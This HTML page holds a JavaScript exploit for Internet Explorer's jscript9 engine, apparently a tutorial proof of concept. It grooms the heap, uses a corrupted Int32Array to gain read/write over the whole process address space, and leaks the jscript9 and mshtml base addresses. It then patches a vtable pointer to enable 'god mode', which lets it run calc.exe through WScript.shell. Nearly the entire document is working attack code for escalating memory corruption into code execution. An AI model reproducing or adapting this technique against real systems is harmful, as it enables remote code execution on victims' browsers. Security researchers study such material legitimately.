<!DOCTYPE html>
<html>
<head>
<script type="text/javascript">
	(function() {
		alert("Start!");

		// --------------------------------------------------------
		// From one-byte-write to full process space read-write
		// --------------------------------------------------------
		a = new Array();
		// 8Byte header | 0x58Byte LargeHeapBlock
		// 8Byte header | 0x58Byte LargeHeapBlock
		// 8Byte header | 0x58Byte LargeHeapBlock
		// ...
		// ...
		// ...
		// 8Byte header | 0x58Byte LargeHeapBlock
		// 8Byte header | 0x58Byte ArrayBuffer(buf)
		// 8Byte header | 0x58Byte LargeHeapBlock
		// ...
		// ...
		// ...
		for(i = 0; i < 0x200; ++i) {
			a[i] = new Array(0x3c00);
			if(i == 0x80)
				buf = new ArrayBuffer(0x58);	// Must be exactly 0x58!
			for(j = 0; j < a[i].length; ++j) 	
				a[i][j] = 0x123;
		}

		// 0x0 		ArrayDataHead
		// 0x20 	array[0] address
		// 0x24 	array[1] address
		// ...
		// 0xf000	Int32Array
		// 0xf030	Int32Array
		// ...
		// 0xffc0	Int32Array
		// 0xfff0	aligned data
		for(; i < 0x200 + 0x400; ++i) {
			a[i] = new Array(0x3bf8)
			for(j = 0; j < 0x55; ++j)
				a[i][j] = new Int32Array(buf)
		}

		// 08a6f000: vftptr, ?, 0, 3,
		// 08a6f010: 4, 0, 20000016(array_len), 8ce0020(raw_buffer),
		// 08a6f020: 3133de0(JavascriptArrayBuffer)
		alert("Set byte at 08a6f01b to 0x20.");

		// Find the Int32Array whose length is modified.
		int32array = 0;
		for(i = 0x200; i < 0x200 + 0x400; ++i) {
			for(j = 0; j < 0x55; ++j) {
				if(a[i][j].length != 0x58 / 4) {
					int32array = a[i][j];
					break;
				}
			}
			if(int32array != 0)
				break;
		}

		if(int32array == 0) {
			alert("Could not find int32array!");
			window.location.reload();
			return;
		}

		alert("Done!");

		// Check the first LargeHeapBlock.
		// jscript9!LargeHeapBlock::'vftable' @ jscript9 + 1c7c
		var vftptr1 = int32array[0x60 / 4];
		var vftptr2 = int32array[0x60 * 2 / 4];
		var vftptr3 = int32array[0x60 * 3 / 4];
		nextPtr1 = int32array[(0x60 + 0x24) / 4];
		nextPtr2 = int32array[(0x60 * 2 + 0x24) / 4];
		nextPtr3 = int32array[(0x60 * 3 + 0x24) / 4];

		if(vftptr1 & 0xffff != 0x1c7c) {
			alert("Corrupted jscript9!LargeHeapBlick::'vftable' address!");
			window.location.reload();
			return;
		}

		if(vftptr1 != vftptr2 || vftptr2 != vftptr3) {
			alert("VFTables are pointing to different addresses!");
			window.location.reload();
			return;
		}

		if(nextPtr2 - nextPtr1 != 0x60 || nextPtr3 - nextPtr2 != 0x60) {
			alert("LargeHeapBlocks are not allocated at 0x60 offsets!");
			window.location.reload();
			return;
		}

		buf_addr = nextPtr1 - 0x60 * 2;

		// Now we modify int32array again to gain full access address space read/write access.
		alert("Now we modify int32array again to gain full access address space read/write access.");
		

		if(int32array[(0x8a6f000 + 0x1c - buf_addr) / 4] != buf_addr) {
			alert("Error");
			window.location.reload();
			return;
		}
		int32array[(0x8a6f000 + 0x18 - buf_addr) / 4] = 0x20000000;		// new length
		int32array[(0x8a6f000 + 0x1c - buf_addr) / 4] = 0;				// new buffer address

		function read(address) {
			var k = address & 3;
			if(k == 0) {
				// ####
				return int32array[address / 4]
			}
			else {
				alert("To debug");
				// .### #... or ..## ##.. or ...# ###.
				return (int32array[(address - k) / 4] >> k * 8) |
					(int32array[(address - k + 4) / 4] << (32 - k * 8));
			}
		}

		function write(address, value) {
			var k = address & 3;
			if(k == 0) {
				// ####
				int32array[address / 4] = value;
			}
			else {
				// .### #... or ..## ##.. or ...# ###.
				alert("To debug");
				var low = int32array[(address - k) / 4];
				var high = int32array[(address - k + 4) / 4];
				var mask = (1 << k * 8) - 1;		// 0xff or 0xffff or 0xffffff
				low = (low & mask) | (value << k * 8);
				high = (high & (0xffffffff - mask)) | (value >> (32 - k * 8));
				int32array[(address - k) / 4] = low;
				int32array[(address - k + 4) / 4] = high;
			}
		}

		alert("god mode");
		// --------------------------------------------------------
		// God mode
		// --------------------------------------------------------

		// At 0x8a6f000 we can read the VFTptr of an Int32Array
		// jscript!Js::TypedArray<int>::'vftable' @ jscript + 0x38c8
		jscript9 = read(0x8a6f000) - 0x38c8;

		// Now we need to determine the base address of MSHTML.
		// We can create an HTML object and write its reference to the address 0xca0f000 - 4
		// which corresponds to the last element of one of our arrays.
		// Let's find the array at 0x8a6f000 - 4.
		for(i = 0x200; i < 0x200 + 0x400; ++i)
			a[i][0x3bf7] = 0;

		// We write 3 in the last position of one of our arrays.
		// IE encodes the number x as (2 * x + 1) so that it can tell address(dword alligned) and numbers apart.
		// Either we use an odd number or a valid address
		// otherwise IE will crash in the following for loop.
		write(0x8a6f000 - 4, 3);
		leakArray = 0;
		for(i = 0x200; i < 0x200 + 0x400; ++i) {
			if(a[i][0x3bf7] != 0) {
				leakArray = a[i];
				break;
			}
		}
		if(leakArray == 0) {
			alert("Could not find leakArray!");
			window.location.reload();
			return;
		}

		function get_addr(obj) {
			leakArray[0x3bf7] = obj;
			return read(0x8a6f000 - 4);
		}

		// Back to determining the base address of MSHTML.
		// Here's the beginning of the element div
		// MSHTML!CBaseTypeOperations @ mshtml + 0x3d05d
		alert("Back to determining the base address of MSHTML.");
		
		var addr = get_addr(document.createElement("div"));
		mshtml = read(addr + 0x10) - 0x3d05d;

		// We want to overwrit mshtml + 0xc67870 + 0x14 with jscript9 + dbb5c where:
		// mshtml + 0xc67860: 	MSHTML!s_apfnPlainTearoffVtable
		// jscript + 0xdbb5c: 	# LEAVE # RET 4
		// As a result, jscript9!ScriptEngine::CanObjectRun returns true.
		var old = read(mshtml + 0xc67870 + 0x14);
		write(mshtml + 0xc67870 + 0x14, jscript9 + 0xdbb5c);

		alert("now open calc!");
		shell = new ActiveXObject("WScript.shell");
		shell.Exec("calc.exe");

		// God Mode off!
		alert("god mode off!");
		write(mshtml + 0xc67870 + 0x14, old);

		alert("Done!");
	})();
</script>
</head>
<body>
</body>
</html>